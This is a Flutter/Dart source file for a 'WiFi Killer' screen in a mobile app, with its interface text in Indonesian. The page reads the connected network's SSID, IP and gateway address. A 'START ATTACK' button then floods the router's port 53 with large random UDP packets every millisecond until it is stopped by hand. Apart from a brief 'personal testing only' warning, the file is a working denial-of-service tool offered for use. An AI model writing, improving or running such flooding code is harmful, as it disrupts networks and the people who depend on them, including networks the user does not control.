import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:darkverse/theme/app_theme.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(AppTheme.radiusM),
          side: const BorderSide(color: AppTheme.borderSubtle),
        ),
        title: Text(title, style: AppTheme.headingM),
        content: Text(message, style: AppTheme.bodyL),
        actions: [
          Center(
            child: ElevatedButton(
              onPressed: () => Navigator.pop(context),
              style: AppTheme.ghostButton(AppTheme.teal),
              child: const Text("OK"),
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: const TextStyle(color: AppTheme.textMuted, fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: const TextStyle(color: AppTheme.textPrimary))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.bgDeep,
      appBar: AppBar(
        backgroundColor: AppTheme.bgDeep,
        surfaceTintColor: Colors.transparent,
        iconTheme: const IconThemeData(color: AppTheme.textPrimary),
        title: Text("WiFi Killer", style: AppTheme.headingM),
        elevation: 0,
      ),
      body: Padding(
        padding: const EdgeInsets.all(25),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text("Network Analysis", style: AppTheme.headingL),
            const SizedBox(height: 10),
            Text(
              "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi.",
              style: AppTheme.bodyL,
            ),
            const SizedBox(height: 20),

            Container(
              decoration: AppTheme.cardDecor(),
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP Address", ip),
                  _infoRow("Frequency", "$frequency MHz"),
                  _infoRow("Router IP", routerIp),
                ],
              ),
            ),

            const SizedBox(height: 40),

            Center(
              child: SizedBox(
                height: 60,
                width: double.infinity,
                child: ElevatedButton.icon(
                  onPressed: isKilling ? _stopFlood : _startFlood,
                  style: isKilling
                      ? AppTheme.primaryButton(AppTheme.peach)
                      : AppTheme.primaryButton(AppTheme.teal),
                  icon: Icon(isKilling ? Icons.stop : Icons.wifi_off, color: AppTheme.bgDeep, size: 24),
                  label: Text(
                    isKilling ? "STOP ATTACK" : "START ATTACK",
                    style: const TextStyle(fontSize: 16, letterSpacing: 2, fontWeight: FontWeight.w800, color: AppTheme.bgDeep),
                  ),
                ),
              ),
            ),

            const SizedBox(height: 20),

            if (isKilling)
              Center(
                child: Column(
                  children: [
                    const CircularProgressIndicator(color: AppTheme.teal),
                    const SizedBox(height: 10),
                    Text(
                      "Sending Packets...",
                      style: TextStyle(color: AppTheme.teal),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}
